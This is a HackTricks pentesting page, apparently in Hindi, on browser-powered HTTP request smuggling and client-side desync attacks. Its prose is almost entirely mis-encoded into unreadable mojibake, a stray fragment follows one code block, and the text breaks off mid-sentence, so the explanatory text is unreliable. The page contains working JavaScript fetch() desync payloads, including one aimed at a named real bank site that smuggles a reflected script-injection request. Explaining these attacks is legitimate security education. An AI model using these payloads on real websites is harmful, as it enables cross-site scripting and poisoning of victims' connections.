# рдмреНрд░рд╛рдЙрдЬрд╝рд░ HTTP рдЕрдиреБрд░реЛрдз рд╕реНрдордЧрд▓рд┐рдВрдЧ

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П HackTricks Cloud тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж Twitter ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ЁЯОЩя╕П Twitch ЁЯОЩя╕П</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ЁЯОе Youtube ЁЯОе</strong></a></summary>

* рдХреНрдпрд╛ рдЖрдк рдХрд┐рд╕реА **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЕрдкрдиреА рдХрдВрдкрдиреА рдХреЛ **HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд** рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ? рдпрд╛ рдХреНрдпрд╛ рдЖрдкрдХреЛ **PEASS рдХреА рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб** рдХрд░рдиреЗ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ? [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFT рд╕рдВрдЧреНрд░рд╣**](https://opensea.io/collection/the-peass-family)
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks swag**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ **рд╢рд╛рдорд┐рд▓** рд╣реЛрдВ рдпрд╛ рдореБрдЭреЗ **Twitter** [**ЁЯРж**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)** рдХрд╛ рдкрд╛рд▓рди рдХрд░реЗрдВ**.
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рдХреЛ** [**hacktricks рд░реЗрдкреЛ**](https://github.com/carlospolop/hacktricks) **рдФрд░** [**hacktricks-cloud рд░реЗрдкреЛ**](https://github.com/carlospolop/hacktricks-cloud) **рдореЗрдВ PR рдЬрдорд╛ рдХрд░рдХреЗ рдЕрдкрдиреА рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВред**

</details>

## CL.0/H2.0 рдмреНрд░рд╛рдЙрдЬрд╝рд░-рд╕рдВрдЧрдд рдбреАрд╕рд┐рдВрдХ

рдпрд╣ рд╕реБрд░рдХреНрд╖рд╛ рдХрдордЬреЛрд░реА рдЙрддреНрдкрдиреНрди рд╣реЛрддреА рд╣реИ рдЬрдм **рдмреИрдХрдПрдВрдб рд╕рд░реНрд╡рд░** рджреНрд╡рд╛рд░рд╛ **Content Length** (CL) рд╣реИрдбрд░ рдХреЛ рдкреВрд░реА рддрд░рд╣ рд╕реЗ **рдЕрдирджреЗрдЦрд╛** рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдлрд┐рд░, рдмреИрдХрдПрдВрдб рдмреЙрдбреА рдХреЛ **рджреВрд╕рд░реЗ рдЕрдиреБрд░реЛрдз рдХреЗ рд╡рд┐рдзрд┐ рдХреА рд╢реБрд░реБрдЖрдд** рдХреЗ рд░реВрдк рдореЗрдВ рд╡реНрдпрд╡рд╣рд╛рд░ рдХрд░рддрд╛ рд╣реИред CL рдХреЛ рдЕрдирджреЗрдЦрд╛ рдХрд░рдирд╛ рдЙрд╕реЗ 0 рдХреА рдорд╛рди рдХреЗ рд░реВрдк рдореЗрдВ рд╡реНрдпрд╡рд╣рд╛рд░ рдХрд░рдиреЗ рдХреЗ рд╕рдорд╛рди рд╣реИ, рдЗрд╕рд▓рд┐рдП рдпрд╣ рдПрдХ CL.0 рдбреАрд╕рд┐рдВрдХ рд╣реИ - рдПрдХ [рдЬреНрдЮрд╛рдд](https://i.blackhat.com/USA-20/Wednesday/us-20-Klein-HTTP-Request-Smuggling-In-2020-New-Variants-New-Defenses-And-New-Challenges.pdf) рд▓реЗрдХрд┐рди рдХрдо рдкреНрд░рдпреЛрдЧ рдХреА рдЬрд╛рдиреЗ рд╡рд╛рд▓реА рд╣рдорд▓рд╛ рд╡рд░реНрдЧ рд╣реИред

![](<../../.gitbook/assets/image (3) (1) (2).png>)

рд╣рдорд▓рд╛ рд╕рдВрднрд╡ рдерд╛ рдХреНрдпреЛрдВрдХрд┐ рдмреИрдХрдПрдВрдб рд╕рд░реНрд╡рд░ рдмрд╕ рдПрдХ **POST рдЕрдиреБрд░реЛрдз рдХреА рдЙрдореНрдореАрдж рдирд╣реАрдВ рдХрд░ рд░рд╣рд╛ рдерд╛**ред

{% hint style="warning" %}
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдпрд╣ рд╕реБрд░рдХреНрд╖рд╛ рдХрдордЬреЛрд░реА рдкреВрд░реА рддрд░рд╣ рд╕реЗ **рдорд╛рдиреНрдп**, рд╡рд┐рдирд┐рд░реНрджреЗрд╢-рдЕрдиреБрд░реВрдк **HTTP рдЕрдиреБрд░реЛрдз** рджреНрд╡рд╛рд░рд╛ **рдЯреНрд░рд┐рдЧрд░** рд╣реЛ рд░рд╣реА рд╣реИред рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ **рдлреНрд░рдВрдЯ-рдПрдВрдб рдХреЛ рдХреЛрдИ рд╕реБрд░рдХреНрд╖рд╛ рдирд╣реАрдВ рд╣реИ** рдФрд░ рдпрд╣ рдмреНрд░рд╛рдЙрдЬрд╝рд░ рджреНрд╡рд╛рд░рд╛ рднреА рдЯреНрд░рд┐рдЧрд░ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред
{% endhint %}

**CL.0** рдФрд░ **H2.0** рдХреЗ рдмреАрдЪ рдХреЗрд╡рд▓ рдПрдХ **рдЕрдВрддрд░** рд╣реИ рдХрд┐ рджреВрд╕рд░рд╛ рд╡рд╛рд▓рд╛ **HTTP2** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд░рд╣рд╛ рд╣реИ (рдЬрд┐рд╕рдореЗрдВ рдПрдХ рдирд┐рд╣рд┐рдд рд╕рд╛рдордЧреНрд░реА-рд▓рдВрдмрд╛рдИ рд╣реИрдбрд░ рд╣реЛрддрд╛ рд╣реИ) рд▓реЗрдХрд┐рди **рдмреИрдХрдПрдВрдб рдЙрд╕реЗ рднреА рдЙрдкрдпреЛрдЧ рдирд╣реАрдВ рдХрд░ рд░рд╣рд╛ рд╣реИ**ред

## рдХреНрд▓рд╛рдЗрдВрдЯ-рд╕рд╛рдЗрдб рдбреАрд╕рд┐рдВрдХ

рдкрд╛рд░рдВрдкрд░рд┐рдХ рдбреАрд╕рд┐рдВрдХ рд╣рдорд▓реЗ рдПрдХ **рдлреНрд░рдВрдЯ-рдПрдВрдб рдФрд░ рдмреИрдХрдПрдВрдб** рд╕рд░реНрд╡рд░ рдХреЗ рдмреАрдЪ рдХреА **рдХрдиреЗрдХреНрд╢рди** рдХреЛ **рдкреЙрдЗрдЬрд╝рди** рдХрд░рддреЗ рд╣реИрдВ, рдФрд░ рдЗрд╕рд▓рд┐рдП рд╡реЗ рдЙрди рд╡реЗрдмрд╕рд╛рдЗрдЯреНрд╕ рдкрд░ рдЕрд╕рдВрднрд╡ рд╣реИрдВ рдЬреЛ рдПрдХ рдлреНрд░рдВрдЯ-рдПрдВрдб/рдмреИрдХрдПрдВрдб рд╕рдВрд░рдЪрдирд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдирд╣реАрдВ рдХрд░рддреА рд╣реИрдВред рдпреЗ рдЕрдм рд╕реЗ **рд╕рд░реНрд╡рд░-рд╕рд╛рдЗрдб рдбреАрд╕рд┐рдВрдХ** рд╣реИрдВред рдЕрдзрд┐рдХрд╛рдВрд╢ **рд╕рд░реНрд╡рд░-рд╕рд╛рдЗрдб рдбреАрд╕рд┐рдВрдХ** рдХреЗрд╡рд▓ рдПрдХ **рдХрд╕реНрдЯрдо HTTP рдХреНрд▓рд╛рдЗрдВрдЯ** рджреНрд╡рд╛рд░рд╛ рдПрдХ рдЕрд╡реИрдз рдЕрдиреБрд░реЛрдз рдЬрд╛рд░реА рдХрд░рдиреЗ рд╕реЗ рдЯреНрд░рд┐рдЧрд░ рдХрд┐рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВред

рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдХреЛ рдПрдХ рдбреАрд╕рд┐рдВрдХ рдХреЛ рдХрд╛рд░рдг рдмрдирд╛рдиреЗ рдХреА рдХреНрд╖рдорддрд╛ рдПрдХ рдкреВрд░реА рдирдИ рд╢реНрд░реЗрдгреА рдХреЗ рд╕рдВрдХрдЯ рдХреЛ рд╕рдВрднрд╡ рдХрд░рддреА рд╣реИ рдЬрд┐рд╕реЗ **рдХреНрд▓рд╛рдЗрдВрдЯ-рд╕рд╛рдЗрдб рдбреАрд╕рд┐рдВрдХ** (CSD) рдХрд╣рд╛ рдЬрд╛рддрд╛ рд╣реИред
CSD рд╣рдорд▓рд╛ рдЙрд╕ **рдкреАрдбрд╝рд┐рдд рдХреЗ рд╡реЗрдмрд╕рд╛рдЗрдЯ рдкрд░ рдЬрд╛рдиреЗ рдХреЗ рдмрд╛рдж рд╢реБрд░реВ рд╣реЛрддрд╛ рд╣реИ**, рдЬрд┐рд╕рдХреЗ рдмрд╛рдж рдЙрд╕рдХрд╛ рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдЙрд╕ рд╡реЗрдмрд╕рд╛рдЗрдЯ рдХреЛ **рджреЛ рдХреНрд░реЙрд╕-рдбреЛрдореЗрди рдЕрдиреБрд░реЛрдз** рднреЗрдЬрддрд╛ рд╣реИред **рдкрд╣рд▓рд╛** рдЕрдиреБрд░реЛрдз рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдХреА рдХрдиреЗрдХреНрд╢рди рдХреЛ **рдбреАрд╕рд┐рдВрдХ рдХрд░рдиреЗ** рдФрд░ **рджреВрд╕рд░реЗ рдЕрдиреБрд░реЛрдз рдХреЛ рдЯреНрд░рд┐рдЧрд░** рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рддреИрдпрд╛рд░ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬреЛ рдЖрдорддреМрд░ рдкрд░ рд╣рд╛рдирд┐рдХрд╛рд░рдХ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рджреЗрддрд╛ рд╣реИ,
### рдкреБрд╖реНрдЯрд┐ рдХрд░реЗрдВ

рд╕рдмрд╕реЗ рдкрд╣рд▓реЗ, рд╣рдореЗрдВ рд╣рдорд▓рд╛ рд╢реБрд░реВ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рд╕рд╛рдЗрдЯ рдХрд╛ рдЪрдпрди рдХрд░рдирд╛ рд╣реЛрдЧрд╛ред рдпрд╣ рд╕рд╛рдЗрдЯ **HTTPS рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдкрд╣реБрдВрдЪреА рдЬрд╛рдиреА рдЪрд╛рд╣рд┐рдП** рдФрд░ рд▓рдХреНрд╖реНрдп рд╕реЗ **рдЕрд▓рдЧ рдбреЛрдореЗрди рдкрд░ рд╕реНрдерд┐рдд рд╣реЛрдиреА рдЪрд╛рд╣рд┐рдП**ред

рдЕрдЧрд▓реЗ, рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░реЗрдВ рдХрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ **рдкреНрд░реЙрдХреНрд╕реА рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдирд╣реАрдВ рд╣реИ**, рдлрд┐рд░ рдЕрдкрдиреА рд╣рдорд▓рд╛ рд╕рд╛рдЗрдЯ рдкрд░ рдмреНрд░рд╛рдЙрдЬрд╝ рдХрд░реЗрдВред **рдбреЗрд╡рд▓рдкрд░ рдЯреВрд▓реНрд╕** рдЦреЛрд▓реЗрдВ рдФрд░ **рдиреЗрдЯрд╡рд░реНрдХ рдЯреИрдм** рдкрд░ рд╕реНрд╡рд┐рдЪ рдХрд░реЗрдВред рдкреЛрдЯреЗрдВрд╢рд┐рдпрд▓ рд╕рдорд╕реНрдпрд╛рдУрдВ рдХреЗ рдмрд╛рдж рдореЗрдВ рдмрдЧ рджреБрд░реБрд╕реНрдд рдХрд░рдиреЗ рдореЗрдВ рдорджрдж рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдореИрдВ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╕рдорд╛рдпреЛрдЬрдиреЛрдВ рдХреА рд╕рд┐рдлрд╛рд░рд┐рд╢ рдХрд░рддрд╛ рд╣реВрдБ:

* **"рд▓реЙрдЧ рд╕рдВрд░рдХреНрд╖рд┐рдд рд░рдЦреЗрдВ"** рдЪреЗрдХрдмреЙрдХреНрд╕ рдХрд╛ рдЪрдпрди рдХрд░реЗрдВред
* рдХреЙрд▓рдо рд╣реИрдбрд░ рдкрд░ рджрд╛рдпрд╛рдВ рддрд░рдл рдХреНрд▓рд┐рдХ рдХрд░реЗрдВ рдФрд░ **"рдХрдиреЗрдХреНрд╢рди рдЖрдИрдбреА" рдХреЙрд▓рдо рдХреЛ рд╕рдХреНрд╖рдо рдХрд░реЗрдВ**ред

рдбреЗрд╡рд▓рдкрд░ рдХрдВрд╕реЛрд▓ рдкрд░ рд╕реНрд╡рд┐рдЪ рдХрд░реЗрдВ рдФрд░ fetch() рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЕрдкрдиреЗ рд╣рдорд▓рд╛ рдХреНрд░рдо рдХреЛ рдкреНрд░рддрд┐рд░реВрдкрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЬрд╛рд╡рд╛рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░реЗрдВред рдпрд╣ рдХреБрдЫ рдЗрд╕ рддрд░рд╣ рджрд┐рдЦ рд╕рдХрддрд╛ рд╣реИ:
```javascript
fetch('https://example.com/', {
method: 'POST',
body: "GET /hopefully404 HTTP/1.1\r\nX: Y", // malicious prefix
mode: 'no-cors', // ensure connection ID is visible
credentials: 'include' // poison 'with-cookies' pool
}).then(() => {
location = 'https://example.com/' // use the poisoned connection
})
```
рдореИрдВрдиреЗ рдлреЗрдЪ рдореЛрдб **'no-cors'** рд╕реЗрдЯ рдХрд┐рдпрд╛ рд╣реИ рддрд╛рдХрд┐ Chrome **рдиреЗрдЯрд╡рд░реНрдХ рдЯреИрдм рдореЗрдВ рдХрдиреЗрдХреНрд╢рди рдЖрдИрдбреА рджрд┐рдЦрд╛рдПрдВ**ред рдореИрдВрдиреЗ рднреА **credentials: 'include'** рд╕реЗрдЯ рдХрд┐рдпрд╛ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ Chrome рдореЗрдВ [**рджреЛ рдЕрд▓рдЧ рдХрдиреЗрдХреНрд╢рди рдкреВрд▓**](https://www.chromium.org/developers/design-documents/network-stack/preconnect) рд╣реЛрддреЗ рд╣реИрдВ - рдХреБрдХреАрдЬрд╝ рдХреЗ рд╕рд╛рде рдЕрдиреБрд░реЛрдзреЛрдВ рдХреЗ рд▓рд┐рдП рдПрдХ рдФрд░ рдХреБрдХреАрдЬрд╝ рдХреЗ рдмрд┐рдирд╛ рдЕрдиреБрд░реЛрдзреЛрдВ рдХреЗ рд▓рд┐рдП рдПрдХред рдЖрдк рдЖрдорддреМрд░ рдкрд░ **рдиреЗрд╡рд┐рдЧреЗрд╢рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рдЪрд╛рд╣реЗрдВрдЧреЗ**, рдФрд░ рд╡реЗ **'with-cookies' рдкреВрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВ**, рдЗрд╕рд▓рд┐рдП рдЗрд╕ рдкреВрд▓ рдХреЛ рд╣рдореЗрд╢рд╛ рдкреЙрдЗрдЬрд╝рди рдХрд░рдиреЗ рдХреА рдЖрджрдд рдбрд╛рд▓рдиреЗ рдореЗрдВ рд▓рд╛рдпрдХ рд╣реИред

рдЬрдм рдЖрдк рдЗрд╕реЗ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рддреЗ рд╣реИрдВ, рддреЛ рдЖрдкрдХреЛ рдиреЗрдЯрд╡рд░реНрдХ рдЯреИрдм рдореЗрдВ **рджреЛ рдЕрдиреБрд░реЛрдз** рджрд┐рдЦрд╛рдИ рджреЗрдВрдЧреЗ рдЬрд┐рдирдореЗрдВ **рд╕рдорд╛рди рдХрдиреЗрдХреНрд╢рди рдЖрдИрдбреА** рд╣реЛрдЧреА, рдФрд░ **рджреВрд╕рд░рд╛** рдЕрдиреБрд░реЛрдз рдПрдХ **404** рдЯреНрд░рд┐рдЧрд░ рдХрд░реЗрдЧрд╛:

![](<../../.gitbook/assets/image (158) (2).png>)

рдпрджрд┐ рдпрд╣ рдЙрдореНрдореАрдж рдХреЗ рдЕрдиреБрд╕рд╛рд░ рдХрд╛рдо рдХрд░рддрд╛ рд╣реИ, рддреЛ рдмрдзрд╛рдИ рд╣реЛ - рдЖрдкрдиреЗ рдЦреБрдж рдХреЛ рдПрдХ рдХреНрд▓рд╛рдЗрдВрдЯ-рд╕рд╛рдЗрдб рдбреАрд╕рд┐рдВрдХ рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛ рд▓рд┐рдпрд╛ рд╣реИ!

### рд╢реЛрдз - рд╕реНрдЯреЛрд░

рдПрдХ рд╡рд┐рдХрд▓реНрдк рд╣реИ рдХрд┐ рдЖрдк рд▓рдХреНрд╖рд┐рдд рд╕рд╛рдЗрдЯ рдкрд░ рдРрд╕реА рдХрд╛рд░реНрдпрдХреНрд╖рдорддрд╛ рдХреА рдкрд╣рдЪрд╛рди рдХрд░реЗрдВ рдЬреЛ рдЖрдкрдХреЛ **рдкрд╛рда рдбреЗрдЯрд╛ рд╕рдВрдЧреНрд░рд╣рд┐рдд рдХрд░рдиреЗ** рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИ, рдФрд░ рдкреНрд░реАрдлрд┐рдХреНрд╕ рдХреЛ рдРрд╕реЗ рддреИрдпрд╛рд░ рдХрд░реЗрдВ рдХрд┐ рдЖрдкрдХреЗ рдкреАрдбрд╝рд┐рдд рдХреБрдХреАрдЬрд╝, рдкреНрд░рдорд╛рдгреАрдХрд░рдг рд╣реИрдбрд░реНрд╕, рдпрд╛ рдкрд╛рд╕рд╡рд░реНрдб **рдРрд╕реЗ рд╕реНрдерд╛рди рдкрд░ рд╕рдВрдЧреНрд░рд╣реАрдд рд╣реЛрдВ** рдЬрд╣рд╛рдВ рд╕реЗ рдЖрдк рдЙрдиреНрд╣реЗрдВ рдкреБрдирдГ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдпрд╣ рд╣рдорд▓рд╛ рдлреНрд▓реЛ [рд╕рд░реНрд╡рд░-рд╕рд╛рдЗрдб рдЕрдиреБрд░реЛрдз рдбреАрд╕рд┐рдВрдХ рдХрд░рдиреЗ](https://portswigger.net/web-security/request-smuggling/exploiting#capturing-other-users-requests) рдХреЗ рд▓рд┐рдП рд▓рдЧрднрдЧ рдПрдХ рд╣реА рддрд░реАрдХреЗ рд╕реЗ рдХрд╛рдо рдХрд░рддрд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП рдореИрдВ рдЗрд╕ рдкрд░ рдЬреНрдпрд╛рджрд╛ рд╡рд┐рдЪрд╛рд░ рдирд╣реАрдВ рдХрд░реВрдВрдЧрд╛ред

### рд╢реЛрдз - **рдЪреЗрди рдФрд░ рдкрд┐рд╡рдЯ**

рд╕рд╛рдорд╛рдиреНрдп рдкрд░рд┐рд╕реНрдерд┐рддрд┐рдпреЛрдВ рдореЗрдВ, рдХрдИ рдкреНрд░рдХрд╛рд░ рдХреЗ **рд╕рд░реНрд╡рд░-рд╕рд╛рдЗрдб рд╣рдорд▓реЗ** рдХреЗрд╡рд▓ рдЙрд╕ рд╣рдорд▓рд╛рд╡рд░ рдХреЗ рджреНрд╡рд╛рд░рд╛ рд╢реБрд░реВ рдХрд┐рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВ рдЬрд┐рд╕рдХреЗ рдкрд╛рд╕ рд▓рдХреНрд╖рд┐рдд рд╡реЗрдмрд╕рд╛рдЗрдЯ рддрдХ рд╕реАрдзрд╛ рдкрд╣реБрдВрдЪ рд╣реЛрддреА рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рд╡реЗ **HTTP рдЕрдиреБрд░реЛрдзреЛрдВ рдкрд░ рдирд┐рд░реНрдорд╛рдг рдХрд░рддреЗ рд╣реИрдВ рдЬрд┐рдиреНрд╣реЗрдВ рдмреНрд░рд╛рдЙрдЬрд╝рд░ рднреЗрдЬрдиреЗ рд╕реЗ рдЗрдирдХрд╛рд░ рдХрд░рддреЗ рд╣реИрдВ**, рдЬреИрд╕реЗ рдХрд┐ **HTTP рд╣реЗрдбрд░реНрд╕** рдХреЗ рд╕рд╛рде **рдЫреЗрдбрд╝рдЫрд╛рдбрд╝** рдХрд░рдирд╛ - рд╡реЗрдм рдХреИрд╢ рдкреЙрдЗрдЬрд╝рдирд┐рдВрдЧ, рд╕рдмрд╕реЗ рдЕрдзрд┐рдХ рд╕рд░реНрд╡рд░-рд╕рд╛рдЗрдб рдЕрдиреБрд░реЛрдз рдбреАрд╕рд┐рдВрдХ, рд╣реЛрд╕реНрдЯ-рд╣реЗрдбрд░ рд╣рдорд▓реЗ, рдпреВрдЬрд╝рд░-рдПрдЬреЗрдВрдЯ рдЖрдзрд╛рд░рд┐рдд [SQLi](https://portswigger.net/web-security/sql-injection), CSRF JSON рд╕рд╛рдордЧреНрд░реА рдкреНрд░рдХрд╛рд░ рдФрд░ рдЕрдиреЗрдХ рдЕрдиреНрдпред

рд╕рдлрд▓ рд╣рдорд▓реЗ рдХреЗ рд▓рд┐рдП рд╕рдмрд╕реЗ рд╕рд░рд▓ рдорд╛рд░реНрдЧ рджреЛ рдореБрдЦреНрдп рддрдХрдиреАрдХреЛрдВ рд╕реЗ рдЖрдпрд╛ рдЬреЛ рд╕рд╛рдорд╛рдиреНрдпрддрдГ рд╕рд░реНрд╡рд░-рд╕рд╛рдЗрдб рдбреАрд╕рд┐рдВрдХ рд╣рдорд▓реЛрдВ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВ: [**рд╣реЛрд╕реНрдЯ-рд╣реЗрдбрд░ рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЬрд╛рд╡рд╛рд╕реНрдХреНрд░рд┐рдкреНрдЯ рд╕рдВрд╕рд╛рдзрди рдкреЙрдЗрдЬрд╝рдирд┐рдВрдЧ**](https://portswigger.net/web-security/request-smuggling/exploiting#using-http-request-smuggling-to-turn-an-on-site-redirect-into-an-open-redirect), рдФрд░ рд╣рд╛рдирд┐рдХрд╛рд░рдХ HTML рдХреЗ рд╕рд╛рде рдПрдХ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХреЛ рд╕реНрдкреНрд▓рд╛рдЗрд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП [**HEAD рд╡рд┐рдзрд┐**](https://portswigger.net/web-security/request-smuggling/advanced/request-tunnelling#non-blind-request-tunnelling-using-head) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ред рджреЛрдиреЛрдВ рддрдХрдиреАрдХреЛрдВ рдХреЛ **рдЕрдиреБрдХреВрд▓рд┐рдд** рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХреБрдЫ рдирд╡реАрдирддрдо рдЪреБрдиреМрддрд┐рдпреЛрдВ рдХреЛ рдкрд╛рд░ рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдереА рдЬреЛ **рдкреАрдбрд╝рд┐рдд рдХреЗ рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдореЗрдВ рдХрд╛рд░реНрдп рдХрд░рдиреЗ** рд╕реЗ рдЬреБрдбрд╝реА рдереАрдВред

## рд╣рдорд▓рд╛ рдЙрджрд╛рд╣рд░рдг

### рд╕реНрдЯреИрдХреНрдб рд╣реЗрдб рдЙрджрд╛рд╣рд░рдг

* **рд░рдВрдЧреАрди рд╣рдорд▓рд╛**

![](<../../.gitbook/assets/image (2) (3).png>)

* **JS рд╣рдорд▓рд╛**
```javascript
fetch('https://www.capitalone.ca/assets', {
method: 'POST',
// use a cache-buster to delay the response
body: `HEAD /404/?cb=${Date.now()} HTTP/1.1\r\nHost: www.capitalone.ca\r\n\r\nGET /x?x=<script>alert(1)</script> HTTP/1.1\r\nX: Y`,
credentials: 'include',
mode: 'cors' // throw an error instead of following redirect
}).catch(() => {
location = 'https://www.capitalone.ca/'
})va
```
рд╡реНрдпрд╛рдЦреНрдпрд╛:

* /assets рдореЗрдВ CL.0 рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░реЗрдВ (рдпрд╣ /assets/ рдкрд░ рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ рдХрд░рддрд╛ рд╣реИ рдФрд░ CL рдХреА рдЬрд╛рдВрдЪ рдирд╣реАрдВ рдХрд░рддрд╛ рд╣реИ)
* HEAD рдЕрдиреБрд░реЛрдз рдХреЛ рдЕрдкрдорд╛рдирд┐рдд рдХрд░реЗрдВ (рдХреНрдпреЛрдВрдХрд┐ HEAD рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛рдПрдВ рдЕрднреА рднреА рдПрдХ рд╕рд╛рдордЧреНрд░реА-рд▓рдВрдмрд╛рдИ рдХреЛ рд╕рдВрдмреЛрдзрд┐рдд рдХрд░рддреА рд╣реИрдВ)
* рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдореЗрдВ рдкреНрд░рддрд┐рдмрд┐рдВрдмрд┐рдд рд╣реЛрдиреЗ рд╡рд╛рд▓реЗ GET рдЕрдиреБрд░реЛрдз рдХреЛ рдЕрдкрдорд╛рдирд┐рдд рдХрд░реЗрдВ, рдЬрд┐рд╕рдХреА рд╕рд╛рдордЧреНрд░реА рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдореЗрдВ рдкреНрд░рддрд┐рдмрд┐рдВрдмрд┐рдд рд╣реЛрдЧреАред
* HEAD рдЕрдиреБрд░реЛрдз рдХреА рд╕рд╛рдордЧреНрд░реА-рд▓рдВрдмрд╛рдИ рдХреЗ рдХрд╛рд░рдг, рдЗрд╕ рдЕрдиреБрд░реЛрдз рдХреА рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ HEAD рдЕрдиреБрд░реЛрдз рдХреЗ рд╢рд░реАрд░ рдХреА рд╣реЛрдЧреАред
* рдХреЙрд░реНрд╕ рдореЛрдб рд╕реЗрдЯ рдХрд░реЗрдВред рд╕рд╛рдорд╛рдиреНрдпрддрдГ рдпрд╣ рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рд▓реЗрдХрд┐рди рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ рд╕рд░реНрд╡рд░ рдХреА рдкреНрд░рд╛рд░рдВрднрд┐рдХ POST рдХреА рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдПрдХ рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ рд╣реИ рдЬреЛ рдЕрдЧрд░ рдЕрдиреБрд╕рд░рдг рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ рддреЛ рдЙрддреНрдкрд╛рджрди рдХрд╛рд░реНрдп рдирд╣реАрдВ рдХрд░реЗрдЧрд╛ред рдЗрд╕рд▓рд┐рдП, рдХреЙрд░реНрд╕ рдореЛрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдПрдХ рддреНрд░реБрдЯрд┐ рдХреЛ рдЙрддреНрдкрдиреНрди рдХрд░рдиреЗ рдФрд░ рдкреАрдбрд╝рд┐рдд рдХреЛ 